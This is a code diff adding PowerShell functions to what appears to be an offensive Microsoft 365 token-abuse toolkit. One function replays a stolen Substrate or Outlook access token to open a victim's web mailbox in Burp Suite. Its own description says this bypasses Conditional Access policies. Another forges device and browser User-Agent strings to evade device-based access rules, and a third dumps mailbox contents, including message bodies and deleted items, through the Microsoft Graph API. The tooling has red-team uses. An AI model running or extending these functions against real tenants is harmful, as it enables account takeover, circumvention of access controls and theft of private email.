@@ -534,3 +534,313 @@ function Get-TenantID
         return $TenantId
     }
 }
+
+function Open-OWAMailboxInBrowser
+{
+    <#
+    .DESCRIPTION
+        Open an OWA Office 365 mailbox in BurpSuite's embedded Chromium browser using either a Substrate.Office.com or Outlook.Office.com access token. Note a Substrate.Office.com access token can access the Outlook.Office.com resource and vice versa. This is useful for bypassing AAD application specific Conditional Access Policies.
+    .EXAMPLE
+        Open-OWAMailboxInBrowser -AccessToken $SubstrateToken.access_token
+        ...
+    #>
+    [cmdletbinding()]
+    Param(
+        [Parameter(Mandatory=$True)]
+        [String]$AccessToken,
+        [Parameter(Mandatory=$False)]
+        [ValidateSet('Substrate','Outlook')]
+        [String]$Resource='Substrate',
+        [Parameter(Mandatory=$False)] 
+        [switch]$OnlyReturnCookies,
+        [Parameter(Mandatory=$False)]
+        [ValidateSet('Mac','Windows','AndroidMobile','iPhone')]
+        [String]$Device,
+        [Parameter(Mandatory=$False)]
+        [ValidateSet('Android','IE','Chrome','Firefox','Edge','Safari')]
+        [String]$Browser
+    )
+    Process
+    {
+        if ($OnlyReturnCookies)
+        {
+            if ($Device)
+            {
+                if ($Browser)
+                {
+                    $UserAgent = Forge-UserAgent -Device $Device -Browser $Browser
+                }
+                else
+                {
+                    $UserAgent = Forge-UserAgent -Device $Device
+                }
+            }
+            else 
+            {
+               if ($Browser)
+               {
+                    $UserAgent = Forge-UserAgent -Browser $Browser 
+               } 
+               else 
+               {
+                    $UserAgent = Forge-UserAgent
+               }
+            }
+            $Headers=@{}
+            $Headers["Authorization"] = "Bearer $AccessToken"
+            $Headers["User-Agent"] = $UserAgent
+            $response = Invoke-WebRequest -Uri "https://substrate.office.com/owa/" -Method "GET" -Headers $Headers -SkipHttpErrorCheck
+            $response.Headers.'Set-Cookie'
+            return $response
+        }
+        else
+        {
+            Write-Output "To open the OWA mailbox in a browser using a Substrate Access Token:"
+            Write-Output "1. Open a new BurpSuite Repeater tab & set the Target to 'https://$Resource.office.com'"
+            Write-Output "2. Paste the below request into Repeater & Send"
+            Write-Output "3. Right click the response > 'Show response in browser', then open the response in Burp's embedded browser"
+            Write-Output "4. Refresh the page to access the mailbox"
+            Write-Output "----------------------------------------------------------------------------"
+            Write-Output "GET /owa/ HTTP/1.1"
+            Write-Output "Host: $Resource.office.com"
+            Write-Output "Authorization: Bearer $AccessToken"
+            Write-Output ""
+            Write-Output ""
+            Write-Output "----------------------------------------------------------------------------"
+        }
+   }  
+}
+
+function Forge-UserAgent
+{
+      <#
+    .DESCRIPTION
+        Forge the User-Agent when sending requests to the Microsoft API's. Useful for bypassing device specific Conditional Access Policies. Defaults to Windows Edge.
+    #>
+    [cmdletbinding()]
+    Param(
+        [Parameter(Mandatory=$False)]
+        [ValidateSet('Mac','Windows','AndroidMobile','iPhone')]
+        [String]$Device,
+        [Parameter(Mandatory=$False)]
+        [ValidateSet('Android','IE','Chrome','Firefox','Edge','Safari')]
+        [String]$Browser
+    )
+    Process
+    {
+        if ($Device -eq 'Mac')
+        {
+            if ($Browser -eq 'Chrome')
+            {
+                $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36'
+            }
+            elseif ($Browser -eq 'Firefox')
+            {
+                $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:70.0) Gecko/20100101 Firefox/70.0'
+            }
+            elseif ($Browser -eq 'Edge')
+            {
+                $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/604.1 Edg/91.0.100.0'
+            }
+            elseif ($Browser -eq 'Safari')
+            {
+                $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'
+            }
+            else 
+            {
+                $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'
+            }
+        }
+        elseif ($Device -eq 'Windows')
+        {
+            if ($Browser -eq 'IE')
+            {
+                $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko'
+            }
+            elseif ($Browser -eq 'Chrome')
+            {
+                $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36'
+            }
+            elseif ($Browser -eq 'Firefox')
+            {
+                $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:70.0) Gecko/20100101 Firefox/70.0'
+            }
+            elseif ($Browser -eq 'Edge')
+            {
+                $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19042'
+            }
+            else 
+            {
+                $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19042'
+            }
+        }
+        elseif ($Device -eq 'AndroidMobile')
+        {
+            if ($Browser -eq 'Android')
+            {
+                $UserAgent = 'Mozilla/5.0 (Linux; U; Android 4.0.2; en-us; Galaxy Nexus Build/ICL53F) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
+            }
+            elseif ($Browser -eq 'Chrome')
+            {
+                $UserAgent = 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36'
+            }
+            elseif ($Browser -eq 'Firefox')
+            {
+                $UserAgent = 'Mozilla/5.0 (Android 4.4; Mobile; rv:70.0) Gecko/70.0 Firefox/70.0'
+            }
+            elseif ($Browser -eq 'Edge')
+            {
+                $UserAgent = 'Mozilla/5.0 (Linux; Android 8.1.0; Pixel Build/OPM4.171019.021.D1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36 EdgA/42.0.0.2057'
+            }
+            else 
+            {
+                $UserAgent = 'Mozilla/5.0 (Linux; U; Android 4.0.2; en-us; Galaxy Nexus Build/ICL53F) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
+            }
+        }
+        elseif ($Device -eq 'iPhone')
+        {
+            if ($Browser -eq 'Chrome')
+            {
+                $UserAgent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/91.0.4472.114 Mobile/15E148 Safari/604.1'
+            }
+            elseif ($Browser -eq 'Firefox')
+            {
+                $UserAgent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) FxiOS/1.0 Mobile/12F69 Safari/600.1.4'
+            }
+            elseif ($Browser -eq 'Edge')
+            {
+                $UserAgent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 EdgiOS/44.5.0.10 Mobile/15E148 Safari/604.1'
+            }
+            elseif ($Browser -eq 'Safari')
+            {
+                $UserAgent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1'
+            }
+            else 
+            {
+                $UserAgent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1'
+            }
+        }
+        else 
+        {
+            #[ValidateSet('Android','IE','Chrome','Firefox','Edge','Safari')]
+            if ($Browser -eq 'Android')
+            {
+                $UserAgent = 'Mozilla/5.0 (Linux; U; Android 4.0.2; en-us; Galaxy Nexus Build/ICL53F) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
+            }
+            elseif($Browser -eq 'IE')
+            { 
+                $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko'
+            }
+            elseif($Browser -eq 'Chrome')
+            { 
+                $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36'
+            }
+            elseif($Browser -eq 'Firefox')
+            { 
+                $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:70.0) Gecko/20100101 Firefox/70.0'
+            }
+            elseif($Browser -eq 'Safari')
+            {
+                $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15' 
+            }
+            else
+            {
+                $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19042'
+            } 
+        }
+        return $UserAgent
+   }   
+}
+function Dump-OWAMailboxViaMSGraphApi
+{
+<#
+    .DESCRIPTION
+        Dump the OWA Office 365 mailbox with a Graph.Microsoft.com access token.
+    .EXAMPLE
+        Dump-OWAMailboxViaMSGraphApi -AccessToken $MSGraphToken.access_token -mailFolder AllItems -top 1
+        ...
+    #>
+    [cmdletbinding()]
+    Param(
+        [Parameter(Mandatory=$True)]
+        [String]$AccessToken,
+        [Parameter(Mandatory=$True)]
+	    [ValidateSet('AllItems','inbox','archive','drafts','sentitems','deleteditems','recoverableitemsdeletions')]
+	    [String]$mailFolder,
+        [Parameter(Mandatory=$False)]
+	    [Int]$top=0,
+        [Parameter(Mandatory=$False)]
+        [ValidateSet('Mac','Windows','AndroidMobile','iPhone')]
+        [String]$Device,
+        [Parameter(Mandatory=$False)]
+        [ValidateSet('Android','IE','Chrome','Firefox','Edge','Safari')]
+        [String]$Browser
+    )
+    Process
+    {
+        if ($Device)
+        {
+            if ($Browser)
+            {
+                $UserAgent = Forge-UserAgent -Device $Device -Browser $Browser
+            }
+            else
+            {
+                $UserAgent = Forge-UserAgent -Device $Device
+            }
+        }
+        else 
+        {
+           if ($Browser)
+           {
+                $UserAgent = Forge-UserAgent -Browser $Browser 
+           } 
+           else 
+           {
+                $UserAgent = Forge-UserAgent
+           }
+        }
+        $ApiVersion = "v1.0"
+        $API = "me/MailFolders"
+        $Method = "GET"
+        $Headers=@{}
+        $Headers["Authorization"] = "Bearer $AccessToken"
+        $selectFilter = "select=sender,from,toRecipients,ccRecipients,ccRecipients,replyTo,sentDateTime,id,hasAttachments,subject,importance,bodyPreview,isRead,body,parentFolderId"
+        if($top -eq 0) {
+            $url = "https://graph.microsoft.com/$($ApiVersion)/$($API)/$($mailFolder)/messages?$($selectFilter)"
+            $MaxResults = 400
+            }
+            else {
+            $url = "https://graph.microsoft.com/$($ApiVersion)/$($API)/$($mailFolder)/messages?$($selectFilter)&top=$($top)"
+        }
+        $response = Invoke-RestMethod -Uri $url -ContentType "application/json" -Method $Method -Body $Body -Headers $Headers
+        # Do not loop through page results if -top flag is used
+        if($top){
+            return $response | ConvertTo-Json -Depth 10
+        }
+        # Check if we have more items to fetch
+        if($response.psobject.properties.name -match '@odata.nextLink')
+        {
+            $items=$response.value.count
+            # Loop until finished or MaxResults reached
+            while(($url = $response.'@odata.nextLink') -and $items -lt $MaxResults)
+            {
+                $response.value | ConvertTo-Json -Depth 10
+                $response = Invoke-RestMethod -Uri $url -ContentType "application/json" -Method $Method -Body $Body -Headers $Headers
+                $items+=$response.value.count
+            }
+            $response.value | ConvertTo-Json -Depth 10
+        }
+        else
+        {
+            if($response.psobject.properties.name -match "Value")
+            {
+                return $response.value | ConvertTo-Json -Depth 10
+            }
+            else
+            {
+                return $response | ConvertTo-Json -Depth 10
+            }
+        }
+    }
+}
